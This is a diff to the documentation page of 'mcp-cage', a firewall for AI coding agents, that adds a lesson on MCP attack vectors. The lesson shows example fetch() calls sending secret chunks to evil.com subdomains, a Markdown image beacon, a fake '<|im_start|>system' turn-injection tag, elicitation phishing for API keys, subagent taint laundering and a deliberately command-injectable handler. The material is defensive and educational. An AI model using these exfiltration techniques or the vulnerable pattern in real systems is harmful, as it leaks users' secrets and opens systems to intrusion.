@@ -1014,7 +1014,7 @@
     <div class="sticky-nav-inner">
       <div class="brand">
         <span>🛡️ <code>mcp-cage</code></span>
-        <span class="brand-version">v0.4.1</span>
+        <span class="brand-version">v0.4.2</span>
       </div>
       <div class="nav-links">
         <a href="#integration-modes">5 Modes</a>
@@ -1037,9 +1037,9 @@
         <span>·</span>
         <span>100% PYTHON 3.10+ STDLIB</span>
       </div>
-      <h1><code>mcp-cage</code> v0.4.1 — Zero-Code Wire &amp; Native-Hook Security Firewall</h1>
+      <h1><code>mcp-cage</code> v0.4.2 — Zero-Code Wire &amp; Native-Hook Security Firewall</h1>
       <p class="hero-tagline">
-        <strong>"Gitleaks + Little Snitch for AI Coding Agents"</strong> — Deterministic, non-bypassable Information-Flow Control (IFC), format-preserving secret scrubbing, 34-mechanism CWE parameter guards, 7-vector Agent Skill AST auditing, and OS kernel sandboxing for <strong>Claude Code</strong>, <strong>Cursor</strong>, <strong>OpenAI Codex CLI</strong>, <strong>Google Gemini CLI</strong>, <strong>Google Antigravity (<code>agy</code>)</strong>, and any <strong>Model Context Protocol (MCP)</strong> server.
+        <strong>"Gitleaks + Little Snitch for AI Coding Agents"</strong> — Deterministic, non-bypassable Information-Flow Control (IFC), format-preserving secret scrubbing, 34-mechanism CWE parameter guards, 7-vector Agent Skill &amp; MCP Server AST 0-day scanners (<code>audit-skills</code>, <code>audit-server --format sarif</code>, <code>probe-live</code>), reverse-channel firewall (<code>sampling</code>, <code>roots</code>, <code>elicitation</code>), cross-turn salami-slice exfiltration circuit breaker, SHA-256 hash-chained audit ledger, and OS kernel sandboxing for <strong>Claude Code</strong>, <strong>Cursor</strong>, <strong>OpenAI Codex CLI</strong>, <strong>Google Gemini CLI</strong>, <strong>Google Antigravity (<code>agy</code>)</strong>, and any <strong>Model Context Protocol (MCP)</strong> server.
       </p>
 
       <div class="hero-meta-row">
@@ -1054,7 +1054,7 @@
       <div class="hero-install-grid">
         <div class="card" style="padding:12px 14px;">
           <div style="font-size:11.5px; font-weight:700; color:var(--cyan); text-transform:uppercase; margin-bottom:6px;">
-            1. Pre-Flight Audit Configs + Agent Skills (&lt;30s)
+            1. Pre-Flight Audit Configs, Skills &amp; MCP Server Repos (&lt;30s)
           </div>
           <div class="copyable">
             <span class="copy-wrap">
@@ -1064,8 +1064,8 @@
               <span class="copy-tip" role="status"></span>
             </span>
             <pre class="code-box" id="heroQuickInstallCode" style="min-height:74px; padding:10px 76px 10px 12px; font-size:12px;">pip install --upgrade mcp-cage
-mcp-cage audit-config --workspace .
-mcp-cage audit-skills --workspace .</pre>
+mcp-cage audit-config --workspace . &amp;&amp; mcp-cage audit-skills --workspace .
+mcp-cage audit-server . --format sarif</pre>
           </div>
         </div>
         <div class="card" style="padding:12px 14px;">
@@ -1101,18 +1101,18 @@ mcp-cage hook claude PreToolUse --db .mcp-cage/taint.db</pre>
         </div>
         <div class="card" style="padding:12px 14px;">
           <div style="font-size:11.5px; font-weight:700; color:var(--amber); text-transform:uppercase; margin-bottom:6px;">
-            4. Toxic-Flow Graph Audit, OS Kernel Sandbox &amp; Live Status
+            4. Live Server Probing, Kernel Sandbox &amp; SHA-256 Audit Verify
           </div>
           <div class="copyable">
             <span class="copy-wrap">
-              <button type="button" class="copy-button" command="--copy" commandfor="heroQuickSandboxCode" aria-label="Copy toxic-flow audit, OS sandbox compilation, and status commands">
+              <button type="button" class="copy-button" command="--copy" commandfor="heroQuickSandboxCode" aria-label="Copy live probe, OS sandbox compilation, and audit verification commands">
                 <span aria-hidden="true">📋</span> Copy
               </button>
               <span class="copy-tip" role="status"></span>
             </span>
-            <pre class="code-box" id="heroQuickSandboxCode" style="min-height:74px; padding:10px 76px 10px 12px; font-size:12px;">mcp-sploit audit
+            <pre class="code-box" id="heroQuickSandboxCode" style="min-height:74px; padding:10px 76px 10px 12px; font-size:12px;">mcp-cage probe-live -- npx -y @modelcontextprotocol/server-filesystem .
 mcp-cage compile-sandbox --workspace . --os auto
-mcp-cage status --db .mcp-cage/taint.db</pre>
+mcp-cage verify-audit --audit-file .mcp-cage/audit.jsonl</pre>
           </div>
         </div>
       </div>
@@ -1234,10 +1234,10 @@ mcp-cage status --db .mcp-cage/taint.db</pre>
     </section>
 
     <!-- 2A. AI & AGENTIC SECURITY FUNDAMENTALS ACADEMY FOR EVERY AI TOOL USER -->
-    <section id="security-fundamentals" class="section-block" data-sync-version="0.4.1" data-sync-cwe-count="34">
+    <section id="security-fundamentals" class="section-block" data-sync-version="0.4.2" data-sync-cwe-count="34">
       <div class="section-header">
         <div>
-          <div class="section-eyebrow">Interactive Visual Security Guide · Updated with v0.4.1 (34 Empirical CWEs &amp; 7 Skill AST Vectors)</div>
+          <div class="section-eyebrow">Interactive Visual Security Guide · Updated with v0.4.2 (34 Empirical CWEs, 7 Skill AST Vectors &amp; 7 MCP Server 0-Day AST Sinks)</div>
           <h2 class="section-title" id="academy-heading">AI &amp; Agentic Security Fundamentals: How Real-World Attacks Happen &amp; How <code>mcp-cage</code> Stops Them</h2>
           <p class="section-subtitle">
             Whether you are an AI power-user, product builder, data scientist, researcher, or developer using tools like Claude, Cursor, Gemini, or ChatGPT, every AI agent shares one fundamental trait: <strong>the AI model cannot reliably tell the difference between your instructions and untrusted text it reads from the outside world</strong>. Start with the visual overview below to see the <strong>4 Key Takeaways at a Glance</strong>, then expand any of the 10 real-world lessons to see how each vulnerability happens and how <code>mcp-cage</code> blocks it automatically.
@@ -1471,11 +1471,11 @@ mcp-cage status --db .mcp-cage/taint.db</pre>
       <section class="accordion" id="fundamentals-accordion" aria-labelledby="academy-heading">
         <div class="accordion-header-bar">
           <div style="font-size:13.5px; font-weight:700; color:var(--text-bright);">
-            10 Interactive Real-World Lessons (Click Any Lesson or Expand All to Compare Vulnerable Patterns vs. <code>mcp-cage</code> Protection)
+            11 Interactive Real-World Lessons (Click Any Lesson or Expand All to Compare Vulnerable Patterns vs. <code>mcp-cage</code> Protection)
           </div>
           <button type="button" class="toggle-all-btn" commandfor="fundamentals-accordion" command="--toggle-all" aria-expanded="false">
-            <span class="expand">Expand all 10 lessons</span>
-            <span class="collapse">Collapse all 10 lessons</span>
+            <span class="expand">Expand all 11 lessons</span>
+            <span class="collapse">Collapse all 11 lessons</span>
           </button>
         </div>
 
@@ -2079,6 +2079,64 @@ get_crawl_result(job_id="maple-river-falcon-orbit-secret")
                 <div class="academy-panel-title" style="color:var(--cyan);">🔧 4. Practical Takeaway</div>
                 <pre class="code-box" style="min-height:110px; font-size:11.5px;">Enforce strict identifier formats (`UUIDv4` / `ULID`) on ID
 parameters and cap repetitive zero-progress tool retries.</pre>
+              </div>
+            </div>
+          </div>
+        </details>
+
+        <details>
+          <summary>Lesson 11 · Reverse-Channel Protocol Abuse (`sampling`, `roots`, `elicitation`), Multi-Turn Salami-Slice Exfiltration &amp; 3rd-Party MCP Server 0-Day Hunting (`audit-server` &amp; `probe-live`)</summary>
+          <div class="details-inner">
+            <p>
+              <strong>How this happens in everyday AI tool use:</strong> Even when outbound tool parameters are checked, three advanced threats remain: (1) A compromised MCP server can use <strong>reverse-direction protocol requests</strong> (<code>sampling/createMessage</code> with <code>includeContext: "allServers"</code>, <code>roots/list</code> host folder enumeration, or <code>elicitation/create</code> popup forms phishing for your API key/password) or embed zero-click <strong>Markdown image beacons</strong> (<code>![img](https://evil.com/leak?d=...)</code>) and fake turn-closing tags (<code>&lt;/tool_result&gt;&lt;|im_start|&gt;system</code>) in tool outputs; (2) An attacker can <strong>"salami-slice"</strong> a stolen secret into tiny 8-character chunks across 5 consecutive calls (<code>a1b2c3d4.evil.com</code>, <code>e5f60718.evil.com</code>) or launder taint by spawning a child subagent (<code>Task</code>); and (3) Third-party MCP servers you download can contain classical source-to-sink 0-day bugs (<code>CWE-78</code>, <code>CWE-22</code>, <code>CWE-89</code>, <code>CWE-918</code>, <code>0.0.0.0</code> DNS rebinding).
+            </p>
+            <div style="overflow-x:auto; margin:10px 0 12px; background:#090e1a; border:1px solid var(--border); border-radius:8px; padding:10px;">
+              <svg viewBox="0 0 920 116" width="100%" style="min-width:680px; max-height:120px; display:block;" role="img" aria-label="Lesson 11 diagram showing reverse-channel sampling/roots/elicitation abuse, multi-turn salami-slice exfiltration, and 3rd-party MCP server 0-day discovery">
+                <rect x="8" y="8" width="438" height="100" rx="8" fill="#1f090d" stroke="#ef4444" stroke-width="1.2"/>
+                <text x="20" y="27" fill="#fca5a5" font-size="11" font-weight="800">❌ WITHOUT mcp-cage (Reverse-Channel, Salami-Slice &amp; Server 0-Days)</text>
+                <text x="20" y="46" fill="#fde68a" font-size="9.5" font-family="monospace">1. Server -&gt; Client: <tspan fill="#f87171" font-weight="700">elicitation/create</tspan> ("Enter API key") / <tspan fill="#f87171" font-weight="700">roots/list</tspan></text>
+                <text x="20" y="64" fill="#fde68a" font-size="9.5" font-family="monospace">2. Salami-Slice:     Call 1 <tspan fill="#f87171">a1b2c3d4</tspan>.evil.com + Call 2 <tspan fill="#f87171">e5f60718</tspan>.evil.com</text>
+                <text x="20" y="82" fill="#fde68a" font-size="9.5" font-family="monospace">3. Subagent Launder: Tainted parent spawns clean <tspan fill="#f87171">Task(child_agent)</tspan></text>
+                <text x="20" y="99" fill="#fde68a" font-size="9.5" font-family="monospace">4. 3rd-Party Server: @mcp.tool() flows into <tspan fill="#f87171">subprocess(shell=True)</tspan></text>
+
+                <rect x="466" y="8" width="446" height="100" rx="8" fill="#042f2e" stroke="#10b981" stroke-width="1.2"/>
+                <text x="478" y="27" fill="#6ee7b7" font-size="11" font-weight="800">🛡️ WITH mcp-cage v0.4.2 (Reverse Firewall, Ledger &amp; 0-Day AST Hunter)</text>
+                <text x="478" y="46" fill="#a7f3d0" font-size="10">• Blocks <tspan fill="#fcd34d" font-family="monospace">elicitation</tspan> phishing, <tspan fill="#fcd34d" font-family="monospace">roots/list</tspan> &amp; strips Markdown image beacons</text>
+                <text x="478" y="64" fill="#a7f3d0" font-size="10">• <tspan fill="#6ee7b7" font-family="monospace">domain_egress_ledger</tspan> concatenates cross-turn slices &amp; trips breaker</text>
+                <text x="478" y="82" fill="#a7f3d0" font-size="10">• Propagates taint to subagents &amp; chains <tspan fill="#6ee7b7" font-family="monospace">audit.jsonl</tspan> via SHA-256</text>
+                <text x="478" y="99" fill="#34d399" font-size="10" font-weight="800">• `audit-server --format sarif` &amp; `probe-live` find 0-days pre-flight!</text>
+              </svg>
+            </div>
+            <div class="academy-lesson-grid">
+              <div class="academy-panel vuln">
+                <div class="academy-panel-title" style="color:var(--red);">❌ 1. Vulnerable MCP Server Handler</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;">@mcp.tool()
+def run_diag(host_arg: str, access_token: str):
+    # CWE-863 OAuth Confused Deputy + CWE-78 Cmd Injection
+    return subprocess.check_output(
+        f"ping -c 1 {host_arg}", shell=True
+    )</pre>
+              </div>
+              <div class="academy-panel attack">
+                <div class="academy-panel-title" style="color:var(--amber);">💥 2. Reverse-Channel / Salami-Slice Attack</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;">// 1. Server sends elicitation/create asking for api_key
+// 2. Or slices secret into 10-char chunks across turns:
+Turn 1: fetch("https://a1b2c3d4e5.evil.com/p")
+Turn 2: fetch("https://f60718293a.evil.com/p")</pre>
+              </div>
+              <div class="academy-panel cage">
+                <div class="academy-panel-title" style="color:var(--green);">🛡️ 3. How mcp-cage v0.4.2 Stops &amp; Hunts It</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;">1. `mcp-cage audit-server . --format sarif` &amp; `probe-live`
+   detect all 7 server 0-day sink vectors + CWE-209 oracles!
+2. `domain_egress_ledger` blocks cross-turn salami-slicing.
+3. Reverse firewall blocks `roots`/`elicitation`/`sampling`.
+4. `mcp-cage verify-audit` verifies SHA-256 `audit.jsonl`.</pre>
+              </div>
+              <div class="academy-panel fix">
+                <div class="academy-panel-title" style="color:var(--cyan);">🔧 4. Practical Verification Commands</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;">mcp-cage audit-server ./my-mcp-server --format sarif
+mcp-cage probe-live -- python3 ./my-mcp-server/server.py
+mcp-cage verify-audit --audit-file .mcp-cage/audit.jsonl</pre>
               </div>
             </div>
           </div>
@@ -2873,7 +2931,7 @@ parameters and cap repetitive zero-progress tool retries.</pre>
 
     <footer>
       <div>
-        <strong><code>mcp-cage</code> v0.4.1</strong> · Built by <a href="https://github.com/nagarajulu" target="_blank" rel="noopener">Nagarajulu (Naga) Aerakoni</a> · Senior Software Engineer @ Amazon &amp; Agentic Systems Security Researcher
+        <strong><code>mcp-cage</code> v0.4.2</strong> · Built by <a href="https://github.com/nagarajulu" target="_blank" rel="noopener">Nagarajulu (Naga) Aerakoni</a> · Senior Software Engineer @ Amazon &amp; Agentic Systems Security Researcher
       </div>
       <div>
         <a href="https://github.com/nagarajulu/mcp-cage" target="_blank" rel="noopener">GitHub Repository</a> ·
